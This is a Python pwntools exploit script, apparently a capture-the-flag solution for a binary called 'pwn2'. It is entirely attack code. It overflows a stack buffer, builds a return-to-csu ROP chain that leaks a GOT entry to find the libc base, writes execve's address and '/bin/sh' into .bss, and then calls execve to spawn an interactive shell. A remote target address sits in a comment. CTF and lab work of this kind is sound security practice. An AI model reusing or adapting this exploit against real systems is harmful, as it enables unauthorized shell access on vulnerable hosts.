#!/usr/bin/env python
from pwn import *

elf = ELF('pwn2')
libc = ELF('libc.so.6')
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
context.log_level = "debug"
p = process('./pwn2')
#p = remote("173.1.3.251",10001)

got_write = elf.got['write']
print "got_write: " + hex(got_write)
got_read = elf.got['read']
print "got_read: " + hex(got_read)

main = 0x000000000040059D

off_system_addr = libc.symbols['write'] - libc.symbols['system']
print "off_system_addr: " + hex(off_system_addr)

#rdi=  edi = r15,  rsi = r14, rdx = r13 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  "\x00"*0x80 + "junkjunk"
payload1 += p64(0x000000000040062A) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) # pop_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x0000000000400610) # mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
payload1 += "\x00"*56
payload1 += p64(main)

p.recvuntil("Hello, World\n")

print "\n#############sending payload1#############\n"
p.send(payload1)
sleep(1)
write_addr = u64(p.recv(8))
print "write_addr: " + hex(write_addr)
libc.address = write_addr - libc.symbols["write"]

#system_addr = libc.symbols["system"]
#print "system_addr: " + hex(system_addr)
execve_addr = libc.symbols["execve"]

bss_addr=0x0000000000601048

p.recvuntil("Hello, World\n")

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  "\x00"*136
payload2 += p64(0x000000000040062A) + p64(0) + p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x0000000000400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += "\x00"*56
payload2 += p64(main)

print "\n#############sending payload2#############\n"
p.send(payload2)
sleep(1)

p.send(p64(execve_addr)+"/bin/sh\0")
sleep(1)

p.recvuntil("Hello, World\n")

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = "/bin/sh")
payload3 =  "\x00"*136
payload3 += p64(0x000000000040062A) + p64(0) + p64(0) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr+8) # pop_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x0000000000400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += "\x00"*56
payload3 += p64(main)

print "\n#############sending payload3#############\n"

sleep(1)
p.send(payload3)

p.interactive()
